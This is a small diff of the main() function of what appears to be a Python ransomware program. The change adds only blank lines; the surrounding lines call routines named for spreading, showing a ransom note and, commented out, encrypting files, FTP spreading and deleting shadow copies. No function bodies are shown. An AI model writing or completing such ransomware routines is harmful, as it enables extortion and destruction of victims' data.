@@ -123,8 +123,10 @@ def main():
     # hide = win32gui.GetForegroundWindow()
     # win32gui.ShowWindow(hide, win32con.SW_HIDE)
     sleep(5)
+
     virus_property()
     sleep(5)
+
     # find_file()
     # encrypt_file()
     spread()
@@ -134,6 +136,7 @@ def main():
     ransom_note()
     show_ransom_note()
     sleep(5)
+
     # ftp_spread()
     # dlt_shadow_copy()
     # delete_ransomware()
